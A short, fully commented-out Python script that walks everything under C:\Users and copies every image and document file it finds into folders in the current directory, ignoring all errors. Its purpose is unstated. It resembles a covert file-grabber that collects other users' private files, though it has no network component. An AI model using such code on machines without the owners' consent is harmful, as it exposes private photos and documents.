#import os
#import shutil
#def trytocopyphoto(filepath,ext):
#    if filepath.__contains__(ext):
#        try:
#            shutil.copyfile(filepath,
#                            directory_path + "\\Photos\\"+ext.replace('.','')+"\\" + filepath.split('\\')[len(filepath.split('\\')) - 1])
#            print(filepath)
#        except:
#            pass
#def trytocopydocuments(filepath,ext):
#    if filepath.__contains__(ext):
#        try:
#            shutil.copyfile(filepath,
#                            directory_path + "\\Documents\\"+ext.replace('.','')+"\\" + filepath.split('\\')[len(filepath.split('\\')) - 1])
#            print(filepath)
#        except:
#            pass
#directory_path = os.getcwd()
#for root, dirs, files in os.walk("C:\\Users", topdown=False):
#   for name in files:
#         filepath = os.path.join(root, name)
#         if filepath.__contains__(".jpg"):
#            trytocopyphoto(filepath,'.jpg')
#         if filepath.__contains__(".png"):
#            trytocopyphoto(filepath,'.png')
#         if filepath.__contains__(".webp"):
#            trytocopyphoto(filepath,'.webp')
#         if filepath.__contains__(".gif"):
#            trytocopyphoto(filepath,'.gif')
#         if filepath.__contains__(".pdf"):
#            trytocopydocuments(filepath,'.pdf')
#         if filepath.__contains__(".docx"):
#            trytocopydocuments(filepath,'.docx')
#         if filepath.__contains__(".pptx"):
#            trytocopydocuments(filepath,'.pptx')
#         if filepath.__contains__(".txt"):
#            trytocopydocuments(filepath,'.txt')

